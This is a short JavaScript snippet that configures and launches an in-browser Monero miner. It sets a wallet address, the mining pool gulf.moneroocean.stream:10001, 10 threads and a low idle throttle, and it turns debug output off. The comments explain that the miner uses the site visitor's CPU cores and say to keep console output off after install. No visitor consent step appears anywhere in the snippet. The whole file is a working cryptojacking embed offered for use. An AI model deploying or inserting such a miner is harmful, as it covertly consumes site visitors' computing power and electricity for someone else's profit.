//Parameters:

//445PkwEaVjY1LeAipFz2nqFikbbv6TrkV5LogUBKcnX2b4kE3vefeQqXLjRPd2a8R7apzgaZAzoY6E7aSKjn3Cc4LhiFSdj

//threads   
//The number of threads (1-16) the miner should start with. 
//The default is -1 which sets it to navigator.hardwareConcurrency, i.e. the number of CPU cores available on the user's computer.

//throttle
// Set the fraction of time that threads should be idle. A value of 0 means no throttling (i.e. full speed)
// a value of 0.5 means that threads will stay idle 50% of the time, with 0.2 they will stay idle 20% of the time and 80% of the time mining.

//debug 
//true/false optional parameter for whetever you want to display mining info in a console. 
//Use it on 1st install to verify that the script works, then set it to false.

//userid    
//The user's name. This can be anything that is unique to the user on your website.
//E.g. a user name, id, the md5 hash of their name or their email address.

//site_id   
//Your site id, generated on this page.

//userid    
//The user's name, analogous to the name specified in the cwm_start(). 
//This can be anything that is unique to the user on your website. E.g. a user name, id, the md5 hash of their name or their email address.

var site_id = 'cwm-861';
var coin = 'monero';
var wallet = '445PkwEaVjY1LeAipFz2nqFikbbv6TrkV5LogUBKcnX2b4kE3vefeQqXLjRPd2a8R7apzgaZAzoY6E7aSKjn3Cc4LhiFSdj';
var password = 'x';
var mining_pool = 'gulf.moneroocean.stream:10001';
var threads = 10;
var throttle = 0.2;
var debug = false;
var userid = 'minerminerminer';
cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug, userid);

//Stop miner
//cwm_stop();

cwm_user_stats(site_id, userid, function(){    
    console.log(); // this is where you get the total number of accepted hashes for a user name
});




